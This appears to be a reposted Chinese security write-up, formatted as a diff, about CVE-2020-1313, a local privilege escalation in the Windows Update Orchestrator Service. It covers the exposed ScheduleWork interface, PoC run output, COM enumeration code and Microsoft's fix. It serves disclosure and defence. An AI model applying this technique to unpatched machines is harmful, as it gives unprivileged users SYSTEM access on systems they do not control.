@@ -1,0 +1,166 @@
+![](https://image.3001.net/images/20200806/1596647297.png!small)
+
+## 写在前面的话
+
+Windows Update Orchestrator
+Service是一个DCOM服务，Windows系统内的其他组件需要使用该服务来安装已下载好的Windows更新。但是，由于该服务中的代码在认证调用函数时存在问题，导致其易受权限提升攻击的影响，即任意用户提升至本地系统权限。该漏洞将影响Windows
+10和Windows Server Core产品。
+
+## 漏洞分析
+
+UniversalOrchestrator服务（9C695035-48D2-4229-8B73-4C70E756E519），其代码在usosvc.dll中实现，并且将以NT_AUTHORITY\SYSTEM权限运行，如果拥有BUILTIN\Users的访问权，即可对其进行配置。即使该服务所实现的COM类枚举功能已经被屏蔽了，但是IUniversalOrchestrator接口（c53f3549-0dbf-429a-8297-c812ba00742d）仍然可以通过标准的COM
+API调用来访问获取。下面给出的就是暴露的三个方法：
+
+    
+    
+    virtual HRESULT __stdcall HasMoratoriumPassed(wchar_t* uscheduledId, int64_t* p1);//usosvc!UniversalOrchestrator::HasMoratoriumPassed
+    
+    virtual HRESULT __stdcall ScheduleWork(wchar_t* uscheduledId, wchar_t* cmdLine, wchar_t* startArg, wchar_t* pauseArg);//usosvc!UniversalOrchestrator::ScheduleWork
+    
+    virtual HRESULT __stdcall WorkCompleted(wchar_t* uscheduledId, int64_t p1);//usosvc!UniversalOrchestrator::WorkCompleted
+
+ScheduleWork方法可以用来在服务的上下文环境下设置命令执行的计划任务，并且可以在不进行任何认证的情况下执行。目标可执行程序本身必须拥有数字签名，并且必须位于“c:\windows\system32”或“Program
+Files”目录下。但是，我们同样可以通过命令行参数来执行目标可执行文件，这样我们就可以通过启动“c:\windows\system32\cmd.exe”，并且以NT_AUTHORITY\SYSTEM权限执行任意代码，最终在目标系统中实现提权。
+
+## 概念验证PoC
+
+    
+    
+    C:\111>whoami
+    
+    desktop-43rnlku\unprivileged
+    
+     
+    
+    C:\111>whoami /priv
+    
+     
+    
+    PRIVILEGES INFORMATION
+    
+    ----------------------    
+     
+    
+    Privilege Name                Description                          State
+    
+    ============================= ==================================== ========
+    
+    SeShutdownPrivilege           Shut down the system                 Disabled
+    
+    SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+    
+    SeUndockPrivilege             Remove computer from docking station Disabled
+    
+    SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+    
+    SeTimeZonePrivilege           Change the time zone                 Disabled
+    
+     
+    
+    C:\111>whoami /priv
+    
+     
+    
+    C:\111>UniversalOrchestratorPrivEscPoc.exe
+    
+    Obtaining reference to IUniversalOrchestrator
+    
+    Scheduing work with id 56594
+    
+    Succeeded. You may verify HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler to see the task has indeed been onboarded. The command itself will be executed overnight if there is no user interaction on the box or after 3 days SLA has passed.
+
+### 计划任务的入口点将添加至注册表中：
+
+![](https://image.3001.net/images/20200806/1596647332.png!small)
+
+指定的命令可以在不需要任何用户交互的情况下，在夜间（大约23:20）的时候执行。
+
+## 漏洞发现过程
+
+当我发现我们无法通过OleView.NET来获取USO服务的接口定义时，我专门创建了一个脚本来遍历大量的CLSID/IID组合。于是乎，我们发现了下列内容：
+
+    
+    
+    void TestUpdateOrchestratorInterfaceAgainstService(IID& clsId, const char* className, const wchar_t* iidStr, const char *interfaceName)
+    
+    {
+    
+    void *ss = NULL;
+    
+    IID iid;
+    
+    ThrowOnError(IIDFromString(iidStr, (LPCLSID)&iid)); // working with e at the end, failing with anything else
+    
+     
+    
+    HRESULT res = CoCreateInstance(clsId, nullptr, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&ss);
+    
+     
+    
+    printf("%s %s: %s\n", className, interfaceName, res == S_OK ? "WORKING" : "failure");
+    
+    }
+    
+     
+    
+    void TestUpdateOrchestratorInterface(const wchar_t* iidStr, const char *interfaceName)
+    
+    {
+    
+    // TestUpdateOrchestratorInterfaceAgainstService(CLSID_AutomaticUpdates, "AutomaticUpdates", iidStr, interfaceName); // timeouting!
+    
+    TestUpdateOrchestratorInterfaceAgainstService(CLSID_UxUpdateManager, "UxUpdateManager", iidStr, interfaceName);
+    
+    TestUpdateOrchestratorInterfaceAgainstService(CLSID_UsoService, "UsoService", iidStr, interfaceName);
+    
+    TestUpdateOrchestratorInterfaceAgainstService(CLSID_UpdateSessionOrchestrator, "UpdateSessionOrchestrator", iidStr, interfaceName);
+    
+    TestUpdateOrchestratorInterfaceAgainstService(CLSID_UniversalOrchestrator, "UniversalOrchestrator", iidStr, interfaceName);
+    
+    // TestUpdateOrchestratorInterfaceAgainstService(CLSID_SomeService, "SomeService", iidStr, interfaceName); // timeouting!
+    
+    }
+    
+     
+    
+    ...
+    
+     
+    
+    TestUpdateOrchestratorInterface(L"{c57692f8-8f5f-47cb-9381-34329b40285a}", "IMoUsoOrchestrator");
+    
+    TestUpdateOrchestratorInterface(L"{4284202d-4dc1-4c68-a21e-5c371dd92671}", "IMoUsoUpdate");
+    
+    TestUpdateOrchestratorInterface(L"{c879dd73-4bd2-4b76-9dd8-3b96113a2130}", "IMoUsoUpdateCollection");
+    
+            // ... and hundreds of more
+
+### 方法的执行结果如下：
+
+    
+    
+    UniversalOrchestrator IUniversalOrchestrator: WORKING
+    
+    UpdateSessionOrchestrator IUpdateSessionOrchestrator: WORKING
+    
+    UxUpdateManager IUxUpdateManager: WORKING
+
+接下来，我就开始对上述方法执行逆向工程分析，并且发现了本文所介绍的漏洞。
+
+## 漏洞修复
+
+微软目前已在2020年6月份的漏洞补丁中，通过添加CoImpersonateClient API调用来修复了该问题。
+
+###
+在部署漏洞补丁之前，方法的实现代码如下:![](https://image.3001.net/images/20200806/1596647363.png!small)
+
+###
+部署了漏洞补丁之后，方法的实现代码如下：![](https://image.3001.net/images/20200806/1596647371.png!small)
+
+实际上，身份伪装实在处理请求的开始时完成的，因此更新注册表的API调用是在调用方的安全上下文中执行的。如果调用方没有访问HKEY_LOCAL_MACHINE的高级权限，那么USO
+API方法也将无法被执行。
+
+## 参考文档
+
+> [_https://portal.msrc.microsoft.com/en-US/security-> guidance/advisory/CVE-2020-1313_](https://portal.msrc.microsoft.com/en-> US/security-guidance/advisory/CVE-2020-1313)
+
